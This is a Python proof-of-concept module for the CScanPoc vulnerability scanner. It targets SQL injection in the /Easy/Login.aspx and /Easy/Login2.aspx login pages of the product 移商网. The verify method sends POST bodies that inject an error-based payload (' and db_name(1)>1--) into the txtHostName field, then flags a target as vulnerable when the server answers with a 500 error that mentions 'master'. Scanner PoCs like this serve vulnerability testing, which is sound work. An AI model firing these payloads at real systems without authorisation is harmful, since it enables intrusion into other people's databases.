# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '772836f8-fa2f-4607-b53c-677b829cab2c'
    name = '移商网 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        移商网某系统两处SQL注入漏洞。 /Easy/Login.aspx','/Easy/Login2.aspx'
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '移商网'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c5d209d0-a8d6-4b0b-b875-789c59ef081f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payloads = ['/Easy/Login.aspx','/Easy/Login2.aspx']
            postdata = {
                payloads[0] :   '__VIEWSTATE=/wEPDwUKMTMyNjA3OTI4OGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFC2xvZ2luc3VibWl0&txtHostName=%27%20and%20db_name%281%29%3E1--&txtUserName=&txtUserPwd=&loginsubmit.x=41&loginsubmit.y=25',
                payloads[1] :'__VIEWSTATE=/wEPDwULLTEzNDYxNTQ5ODZkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQtsb2dpbnN1Ym1pdA==&txtHostName1=&txtUserName1=&txtUserPwd1=&txtHostName=%27%20and%20db_name%281%29%3E1--&txtUserName=&txtUserPwd=&loginsubmit.x=108&loginsubmit.y=26'
            }
            for payload in payloads:
                url = self.target + payload 
                code, head, res, errcode1, _ = hh.http(url, postdata[payload])
                
                if code == 500 and 'master' in res :
                    #security_hole(arg+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
